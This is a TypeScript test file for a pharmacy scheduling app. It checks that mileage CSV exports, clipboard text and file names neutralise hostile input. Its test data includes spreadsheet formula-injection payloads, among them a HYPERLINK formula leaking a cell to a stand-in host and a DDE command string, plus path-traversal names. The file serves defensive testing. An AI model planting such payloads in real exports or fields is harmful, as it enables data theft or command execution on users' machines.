// Everything the app writes out for other programs: spreadsheet CSV (mileage report), clipboard text (To tell, mileage, diagnostics),
// file names. Hostile text must stay text. Run: node --experimental-strip-types --test domain/test/export-injection.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { seedWorld } from "../src/seed.ts";
import { csvCell, csvLine, oneLine } from "../../app3/exportText.ts";
import { safeFileName } from "../../persist/filename.ts";
import { mileageCsv, mileageReport } from "../../app3/mileage.ts";
import { pdfFileName, periodKey } from "../../app3/print/model.ts";

/** Minimal RFC 4180 reader (quoted fields, doubled quotes, line breaks inside quotes), to prove the writer's output reads back exactly. */
function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [], f = "", q = false, i = 0;
  while (i < text.length) {
    const c = text[i]!;
    if (q) {
      if (c === '"') { if (text[i + 1] === '"') { f += '"'; i += 2; continue; } q = false; i++; continue; }
      f += c; i++; continue;
    }
    if (c === '"' && f === "") { q = true; i++; continue; }
    if (c === ",") { row.push(f); f = ""; i++; continue; }
    if (c === "\n" || c === "\r") { if (c === "\r" && text[i + 1] === "\n") i++; row.push(f); rows.push(row); row = []; f = ""; i++; continue; }
    f += c; i++;
  }
  if (f !== "" || row.length) { row.push(f); rows.push(row); }
  return rows;
}

const TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];
const hostile = [
  "=1+1", "+1+1", "-1+1", "@SUM(A1)", "\t=1+1", "\r=1+1", '=HYPERLINK("http://evil.example/?"&A1,"x")', "=cmd|' /C calc'!A0",
  " =1+1", "\u200b=1+1", "\u0000=1+1", "\ufeff@x", "-2+3", "+cmd", "==1", "=-1",
  'say "hi", ok', "a,b", "line1\nline2", "line1\r\nline2", "\n=1+1", 'he said ""', "  padded  ", "", "\u202eRTL=1", "emoji \u{1F469}\u200d\u2695\ufe0f",
];

test("csvCell: nothing that begins like a formula survives as a formula, and every field reads back exactly", () => {
  for (const h of hostile) {
    const cell = csvCell(h);
    const body = cell === "" ? "" : parseCsv(cell)[0]![0]!;
    if (/^[\s\u0000-\u001f\u007f\u200b-\u200f\u2028\u2029\u2060\ufeff]*[=+\-@]/.test(h) || /^[\t\r]/.test(h)) {
      assert.ok(body.startsWith("'"), `${JSON.stringify(h)} not neutralised: ${JSON.stringify(cell)}`);
      assert.ok(cell.startsWith('"'), `${JSON.stringify(h)} neutralised field must be quoted`);
      assert.equal(body, `'${h}`);
      assert.ok(!TRIGGERS.includes(body[0]!), "first character is no longer a trigger");
    } else {
      assert.equal(body, h, `${JSON.stringify(h)} changed by a round trip`);
    }
  }
});

test("csvCell: RFC 4180 escaping of quotes, commas, CR and LF", () => {
  assert.equal(csvCell('a"b'), '"a""b"');
  assert.equal(csvCell("a,b"), '"a,b"');
  assert.equal(csvCell("a\nb"), '"a\nb"');
  assert.equal(csvCell("a\rb"), '"a\rb"');
  assert.equal(csvCell("plain"), "plain");
  assert.equal(csvCell(""), "");
  assert.equal(csvCell(null), "");
  assert.equal(csvCell(undefined), "");
  const rec = csvLine(["x,y", 'q"', "n\nl", 3, "-4.50", "-5"]);
  assert.deepEqual(parseCsv(rec), [["x,y", 'q"', "n\nl", "3", "-4.50", "-5"]]);
});

test("csvCell: numbers and numeric strings (a negative amount) are left alone, so money is still a number", () => {
  assert.equal(csvCell(-3.5), "-3.5");
  assert.equal(csvCell("-3.50"), "-3.50");
  assert.equal(csvCell(0), "0");
  assert.equal(csvCell(Number.NaN), "");
  assert.equal(csvCell(Number.POSITIVE_INFINITY), "");
  assert.equal(csvCell("-3.50+1"), "\"'-3.50+1\"");
  assert.equal(csvCell("-1e3"), "\"'-1e3\"");
});

test("csvCell: random hostile strings always read back neutralised or exact (seeded)", () => {
  let x = 12345;
  const rnd = () => { x ^= x << 13; x >>>= 0; x ^= x >>> 17; x ^= x << 5; x >>>= 0; return x / 4294967296; };
  const alphabet = ['=', '+', '-', '@', '\t', '\r', '\n', '"', ',', ' ', 'a', '1', '\u200b', '\u0000', '\u202e', "'", "\u{1F600}"];
  for (let n = 0; n < 5000; n++) {
    const len = Math.floor(rnd() * 8);
    let s = "";
    for (let i = 0; i < len; i++) s += alphabet[Math.floor(rnd() * alphabet.length)];
    const rows = parseCsv(csvLine(["k", s, "z"]));
    assert.equal(rows.length, 1, `a field split the record: ${JSON.stringify(s)}`);
    assert.equal(rows[0]!.length, 3);
    const got = rows[0]![1]!;
    assert.ok(got === s || got === `'${s}`, JSON.stringify(s));
    if (got === s && !/^-?\d+(\.\d+)?$/.test(s)) {
      const t = s.replace(/^[\s\u0000-\u001f\u007f\u200b-\u200f\u2028\u2029\u2060\ufeff]+/, "");
      assert.ok(!/^[=+\-@]/.test(t) && !/^[\t\r]/.test(s), `left as is but formula-like: ${JSON.stringify(s)}`);
    }
  }
});

test("mileage CSV: hostile pharmacist names and store codes cannot be formulas and cannot add rows or columns", () => {
  const names = ['=HYPERLINK("http://evil.example","x")', "+SUM(A1:A9)", "-2+3", "@cmd", "\t=1", "\r=1", 'Ann "Q", Jr', "Two\nLines"];
  const stores = [{ id: "S1", code: "=A" }, { id: "S2", code: "+B" }];
  const s = seedWorld({
    stores,
    pharmacists: names.map((n, i) => ({ id: `P${i + 1}`, name: n, base: "S1" })),
    travel: [["S1", "S2", 82, 102.1], ["S2", "S1", 82, 102.1]],
    config: { mileageFreeMiles: 20, mileageRates: [{ effectiveFrom: "2026-01-01", centsPerMile: 70 }] },
    assignments: names.map((_, i) => ({ store: "S2", ph: `P${i + 1}`, date: `2026-10-${String(6 + i).padStart(2, "0")}` })),
  }).state;
  const csv = mileageCsv(s, mileageReport(s, "2026-10"));
  const rows = parseCsv(csv);
  assert.equal(rows.length, 1 + names.length + 1, "header + one row per trip + total");
  for (const r of rows) {
    assert.equal(r.length, 9, JSON.stringify(r));
    for (const c of r) {
      if (/^-?\d+(\.\d+)?$/.test(c)) continue;
      assert.ok(!/^[=+\-@\t\r]/.test(c), `cell would be read as a formula: ${JSON.stringify(c)}`);
    }
  }
  const nameCells = rows.slice(1, -1).map((r) => r[0]);
  assert.deepEqual(nameCells.slice().sort(), names.map((n) => (/^[=+\-@\t\r]/.test(n) ? `'${n}` : n)).sort());
  assert.deepEqual(rows.slice(1, -1).map((r) => r[1]), names.map(() => "'=A"), "base store code");
  assert.deepEqual(rows.slice(1, -1).map((r) => r[3]), names.map(() => "'+B"), "store code");
});

test("oneLine: a typed name or code cannot start a new line when copied", () => {
  assert.equal(oneLine("a\n=1+1"), "a =1+1");
  assert.equal(oneLine("a\r\nb\tc\u0000d\u2028e"), "a b c d e");
  assert.equal(oneLine("  x  "), "x");
  assert.ok(!/[\r\n]/.test(oneLine("\n\n=cmd\r")));
  assert.equal(oneLine("Ann"), "Ann");
});

test("safeFileName: separators, reserved names, length, emptiness, controls", () => {
  const cases = ["../../etc/passwd", "..\\..\\Windows\\win.ini", "C:\\x\\y.sqlite", "a/b/c.sqlite", "CON", "con.sqlite", "NUL.txt", "com1", "LPT9.x", "Prn", "AUX",
    "", " ", "...", "...  ", ".", "..", "name.", "name ", "na\u0000me.sqlite", "tab\there.sqlite", "line\nbreak.sqlite", "\u202egnp.exe", "ok\u200b.sqlite",
    "a:b*c?d\"e<f>g|h.sqlite", "x".repeat(5000), `${"y".repeat(5000)}.sqlite`, "\ud800lone.sqlite", "\u{1F469}\u200d\u2695\ufe0f.sqlite", "\ud83d\ude00".repeat(500), ".hidden", "___", "\u0301\u0301\u0301"];
  for (const c of cases) {
    const n = safeFileName(c);
    assert.ok(n.length > 0 && n.length <= 120, `length ${JSON.stringify(c.slice(0, 20))} -> ${n.length}`);
    assert.ok(!/[\\/:*?"<>|\u0000-\u001f\u007f-\u009f\u202a-\u202e\u200b-\u200f]/.test(n), `bad char in ${JSON.stringify(n)}`);
    assert.ok(!/[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/.test(n), `lone surrogate in ${JSON.stringify(n)}`);
    assert.ok(!/^\.+$/.test(n) && !/[. ]$/.test(n) && !/^\s/.test(n), `dots/space edges ${JSON.stringify(n)}`);
    const stem = n.replace(/\.[^.]*$/, "");
    assert.ok(!/^(con|prn|aux|nul|com[0-9]|lpt[0-9])$/i.test(stem), `reserved ${JSON.stringify(n)}`);
    assert.ok(/[\p{L}\p{N}]/u.test(n), `no real character left: ${JSON.stringify(n)}`);
  }
  assert.equal(safeFileName("Schedule.sqlite"), "Schedule.sqlite");
  assert.equal(safeFileName("a.sqlite"), "a.sqlite");
  assert.equal(safeFileName("My Schedule 2026-10.sqlite"), "My Schedule 2026-10.sqlite");
  assert.ok(safeFileName("../x.sqlite").endsWith("x.sqlite"));
  assert.equal(safeFileName(""), "Schedule.sqlite");
  assert.ok(safeFileName(`${"y".repeat(5000)}.sqlite`).endsWith(".sqlite"), "extension kept when shortened");
  assert.equal(safeFileName("CON"), "_CON");
});

test("print PDF file name: only dates and the revision number, whatever the snapshot says", () => {
  assert.equal(pdfFileName({ from: "2026-10-01", to: "2026-10-31", revision: 3 }), "HiSchool_2026-10_rev3.pdf");
  assert.equal(periodKey("2026-10-05", "2026-10-18"), "2026-10-05_to_2026-10-18");
  const n = pdfFileName({ from: "2026-10-05", to: "2026-10-05", revision: 12 });
  assert.equal(safeFileName(n), n, "already safe, unchanged by the sanitiser");
});

// A new place that writes out to a file or the clipboard must be reviewed for the checks above, so it is listed here.
test("every write-out site in the app is one that has been reviewed", () => {
  const roots = ["app3", "persist"];
  const found = new Map<string, number>();
  const re = /navigator\.clipboard\.writeText|execCommand\(\s*["']copy|createObjectURL|\.download\s*=|showSaveFilePicker|createWritable|new Blob\(|jsPDF|\.save\(/;
  const walk = (d: string) => {
    for (const f of readdirSync(d)) {
      const p = `${d}/${f}`;
      if (f === "node_modules" || f === "test") continue;
      if (statSync(p).isDirectory()) { walk(p); continue; }
      if (!/\.(ts|tsx)$/.test(f) || /\.test\.ts$/.test(f) || f === "fakes.ts") continue;
      const src = readFileSync(p, "utf8").split("\n").filter((l) => re.test(l) && !/^\s*(\/\/|\*)/.test(l)).length;
      if (src) found.set(p, src);
    }
  };
  for (const r of roots) walk(new URL(`../../${r}`, import.meta.url).pathname);
  const root = new URL("../../", import.meta.url).pathname;
  const rel = [...found.keys()].map((p) => p.slice(root.length)).sort();
  // Reviewed: mileage CSV (csvLine), To tell (oneLine), diagnostics (log text, begins with a fixed header), print PDF (dates only name),
  // the schedule file (binary, file name via safeFileName), recovery download.
  assert.deepEqual(rel, [
    "app3/diagnostics.ts", "app3/print/pdf.ts", "app3/views/PrintView.tsx", "app3/views/SaveControls.tsx", "app3/views/chrome/ToTell.tsx",
    "app3/views/setup/parts.tsx", "app3/views/travel/MileageReport.tsx",
    "persist/backends.ts", "persist/core.ts",
  ].sort());
});
